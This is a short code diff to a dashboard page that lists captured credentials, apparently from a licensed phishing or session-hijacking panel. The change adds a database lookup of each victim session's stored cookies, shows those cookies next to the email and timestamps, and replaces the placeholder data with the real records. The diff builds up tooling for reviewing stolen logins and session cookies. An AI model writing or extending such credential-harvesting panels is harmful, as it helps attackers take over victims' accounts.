@@ -70,6 +70,15 @@ export default async function OverviewPage() {
         .where(eq(clients.sessionId, credential.sessionId))
         .limit(1);
 
+      const [dbClientCookie] = await mainDb
+        .select()
+        .from(clientCookies)
+        .where(eq(clientCookies.sessionId, credential.sessionId))
+        .limit(1);
+      
+
+        
+
       return {
         id: `LOG-${String(index + 1).padStart(4, "0")}`,
         email: credential.email,
@@ -81,6 +90,7 @@ export default async function OverviewPage() {
         firstSeen: client?.first_seen ? new Date(client.first_seen).toLocaleString() : "Unknown",
         lastSeen: client?.last_seen ? new Date(client.last_seen).toLocaleString() : "Unknown",
         fullTimestamp: credential.timestamp,
+        cookie: dbClientCookie.cookies
       };
     }),
   );
@@ -98,7 +108,8 @@ export default async function OverviewPage() {
   return (
     <OverviewClient
       // initialRows={rows.length > 0 ? rows : dummyRows}
-      initialRows={dummyRows}
+      initialRows={rows}
+      // initialRows={dummyRows}
       licenseId={session.licenseId}
       expiresAt={license?.expiresAt ?? new Date().toISOString()}
       stats={{
